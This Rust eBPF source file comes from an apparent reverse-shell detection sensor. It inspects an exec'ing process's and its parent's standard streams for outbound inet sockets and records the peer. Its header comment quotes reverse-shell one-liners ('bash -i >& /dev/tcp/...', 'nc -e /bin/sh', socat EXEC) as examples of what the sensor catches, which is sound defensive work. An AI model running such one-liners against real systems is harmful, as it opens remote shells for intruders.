//! Lab PR 224 (CM-03) — the standard streams of an exec.
//!
//! A reverse shell is a shell (or an interpreter) whose stdin and stdout
//! are a network socket: `bash -i >& /dev/tcp/host/port 0>&1`, `nc -e
//! /bin/sh`, `socat … EXEC:`, a Perl or Python one-liner. Whatever the
//! tool, the shell's own file table says it: fd 0 or 1 is an `AF_INET` /
//! `AF_INET6` socket. `sched_process_exec` runs in the new image after
//! the close-on-exec descriptors are gone, so what it reads is what the
//! shell will use.
//!
//! [`nn_stdio_probe`] reads `task->files->fdt->fd[0..2]`; for a file whose
//! inode is a socket (`S_IFSOCK`) `file->private_data` is the `struct
//! socket` and `socket->sk` the `struct sock`, whose `skc_family` says
//! inet or not. The first inet socket's peer and protocol are recorded,
//! and whether any of them was connected out by a local process: its
//! `struct sock` is in `FLOW_SOCK_MAP`, where the `tcp_v[46]_connect`
//! kprobe put it. An accepted socket (inetd, systemd `Accept=yes`, a bind
//! shell), a UDP socket or a connect older than the agent is not.
//!
//! The exec sensor calls it for the new image and for its real parent: a
//! shell spawned on a pty by a process whose stdio is a connected socket
//! (Python's `pty.spawn` after `dup2` of the socket onto 0..2) has a pty on
//! its own fds, the socket on its parent's.
//!
//! Verifier (docs/operator/KERNEL_COMPATIBILITY.md, "Older verifiers"):
//! a global function with integer arguments only (rule 6; kernel addresses
//! go in as `u64`, rule 1), each optional offset consumed by its own
//! `match` (rule 3), the record built in map memory (rule 4), a loop of
//! three constant-bounded steps.

use aya_ebpf::{cty::c_void, helpers::generated, macros::map, maps::PerCpuArray};
use northnarrow_common::wire::{stdio_flags, StdioRaw};

use crate::btf_offsets::{
    FDTABLE_FD_OFFSET, FDTABLE_MAX_FDS_OFFSET, FILES_STRUCT_FDT_OFFSET, FILE_F_INODE_OFFSET,
    FILE_PRIVATE_DATA_OFFSET, INODE_I_MODE_OFFSET, SOCKET_SK_OFFSET, SOCK_SKC_DADDR_OFFSET,
    SOCK_SKC_DPORT_OFFSET, SOCK_SKC_FAMILY_OFFSET, SOCK_SKC_V6_DADDR_OFFSET,
    SOCK_SK_PROTOCOL_OFFSET, TASK_STRUCT_FILES_OFFSET,
};

/// Where [`nn_stdio_probe`] builds its answer: slot 0 the exec'ing task,
/// slot 1 its parent. Copied into the `ProcessSpawnRaw` by the caller.
#[map]
pub static STDIO_SCRATCH: PerCpuArray<StdioRaw> = PerCpuArray::with_max_entries(2, 0);

const S_IFMT: u16 = 0o170_000;
const S_IFSOCK: u16 = 0o140_000;
const AF_INET: u16 = 2;
const AF_INET6: u16 = 10;

#[inline(always)]
unsafe fn peek_u64(src: u64) -> u64 {
    let mut v = core::mem::MaybeUninit::<u64>::uninit();
    let _ = generated::bpf_probe_read_kernel(v.as_mut_ptr() as *mut c_void, 8, src as *const c_void);
    v.assume_init()
}

#[inline(always)]
unsafe fn peek_u32(src: u64) -> u32 {
    let mut v = core::mem::MaybeUninit::<u32>::uninit();
    let _ = generated::bpf_probe_read_kernel(v.as_mut_ptr() as *mut c_void, 4, src as *const c_void);
    v.assume_init()
}

#[inline(always)]
unsafe fn peek_u16(src: u64) -> u16 {
    let mut v = core::mem::MaybeUninit::<u16>::uninit();
    let _ = generated::bpf_probe_read_kernel(v.as_mut_ptr() as *mut c_void, 2, src as *const c_void);
    v.assume_init()
}

/// Fill [`STDIO_SCRATCH`] slot `slot` (0 or 1) with the standard streams
/// of `task` (a `struct task_struct *`); returns the flags written (0 =
/// not read). A global function: the verifier checks it once, on its own.
#[no_mangle]
#[inline(never)]
pub extern "C" fn nn_stdio_probe(task: u64, slot: u64) -> u64 {
    unsafe { stdio_probe(task, (slot & 1) as u32) }
}

#[inline(always)]
unsafe fn stdio_probe(task: u64, slot: u32) -> u64 {
    let out = match STDIO_SCRATCH.get_ptr_mut(slot) {
        Some(p) => p as *mut u8,
        None => return 0,
    };
    // 24 bytes, three words: the slot holds the previous exec's answer.
    // Volatile: three plain zero stores became a `memset` call (rule 9).
    core::ptr::write_volatile(out as *mut u64, 0);
    core::ptr::write_volatile(out.add(8) as *mut u64, 0);
    core::ptr::write_volatile(out.add(16) as *mut u64, 0);
    if task == 0 {
        return 0;
    }
    let o_files = match off_opt!(TASK_STRUCT_FILES_OFFSET) {
        Some(o) => o as u64,
        None => return 0,
    };
    let o_fdt = match off_opt!(FILES_STRUCT_FDT_OFFSET) {
        Some(o) => o as u64,
        None => return 0,
    };
    let o_max = match off_opt!(FDTABLE_MAX_FDS_OFFSET) {
        Some(o) => o as u64,
        None => return 0,
    };
    let o_fd = match off_opt!(FDTABLE_FD_OFFSET) {
        Some(o) => o as u64,
        None => return 0,
    };
    let o_priv = match off_opt!(FILE_PRIVATE_DATA_OFFSET) {
        Some(o) => o as u64,
        None => return 0,
    };
    let o_sk = match off_opt!(SOCKET_SK_OFFSET) {
        Some(o) => o as u64,
        None => return 0,
    };
    let o_inode = off!(FILE_F_INODE_OFFSET) as u64;
    let o_mode = off!(INODE_I_MODE_OFFSET) as u64;
    let o_family = off!(SOCK_SKC_FAMILY_OFFSET) as u64;

    let files = peek_u64(task + o_files);
    if files == 0 {
        return 0;
    }
    let fdt = peek_u64(files + o_fdt);
    if fdt == 0 {
        return 0;
    }
    let max = peek_u32(fdt + o_max) as u64;
    let arr = peek_u64(fdt + o_fd);
    if arr == 0 {
        return 0;
    }
    let mut flags: u8 = stdio_flags::READ;
    let mut first: u64 = 0;
    let mut first_family: u16 = 0;
    let mut fd: u64 = 0;
    while fd < 3 {
        if fd < max {
            let file = peek_u64(arr + 8 * fd);
            let inode = if file != 0 {
                peek_u64(file + o_inode)
            } else {
                0
            };
            let mode = if inode != 0 {
                peek_u16(inode + o_mode)
            } else {
                0
            };
            if mode & S_IFMT == S_IFSOCK {
                let sock = peek_u64(file + o_priv);
                let sk = if sock != 0 { peek_u64(sock + o_sk) } else { 0 };
                let family = if sk != 0 { peek_u16(sk + o_family) } else { 0 };
                if family == AF_INET || family == AF_INET6 {
                    flags |= stdio_flags::FD0_INET << fd;
                    if first == 0 {
                        first = sk;
                        first_family = family;
                    }
                    if crate::tcp_connect::FLOW_SOCK_MAP.get(&sk).is_some() {
                        flags |= stdio_flags::OUTBOUND;
                    }
                }
            }
        }
        fd += 1;
    }
    *out = flags;
    if first != 0 {
        *out.add(1) = first_family as u8;
        *(out.add(2) as *mut u16) =
            u16::from_be(peek_u16(first + off!(SOCK_SKC_DPORT_OFFSET) as u64));
        *out.add(4) = peek_u16(first + off!(SOCK_SK_PROTOCOL_OFFSET) as u64) as u8;
        if first_family == AF_INET {
            *(out.add(8) as *mut u32) = peek_u32(first + off!(SOCK_SKC_DADDR_OFFSET) as u64);
        } else {
            let a = first + off!(SOCK_SKC_V6_DADDR_OFFSET) as u64;
            *(out.add(8) as *mut u64) = peek_u64(a);
            *(out.add(16) as *mut u64) = peek_u64(a + 8);
        }
    }
    flags as u64
}
